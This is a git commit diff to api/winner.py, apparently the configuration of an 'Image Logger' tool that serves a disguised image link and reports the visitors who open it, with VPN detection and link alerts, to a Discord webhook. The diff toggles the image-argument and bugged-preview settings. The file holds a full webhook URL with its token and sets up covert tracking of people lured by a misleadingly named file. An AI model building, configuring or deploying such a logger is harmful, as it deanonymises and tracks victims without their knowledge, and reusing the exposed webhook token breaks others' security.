2ba5541cac3d4b11f97f583ca757b1822699867e
hackyduck <maskstorm1@gmail.com>
2025-05-11 00:32:35 +0200

    Update winner.py

--- api/winner.py
+++ api/winner.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1335247493893586944/TAppETFOUy01pFxjtWZZWAI0iRcmziuZ6ProDX6Q3jEo7AlbpvppmgrnTaVM8B4YGP8c",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
